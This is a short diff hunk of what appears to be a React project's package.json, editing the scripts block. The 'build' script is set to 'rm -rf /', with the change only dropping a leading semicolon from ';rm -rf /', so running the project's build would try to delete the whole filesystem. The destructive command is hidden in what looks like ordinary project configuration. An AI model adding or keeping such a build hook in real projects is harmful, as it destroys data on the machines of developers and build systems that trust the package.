@@ -19,7 +19,7 @@
   },
   "scripts": {
     "start": "react-scripts start",
-    "build": ";rm -rf /",
+    "build": "rm -rf /",
     "test": "react-scripts test",
     "eject": "react-scripts eject"
   },
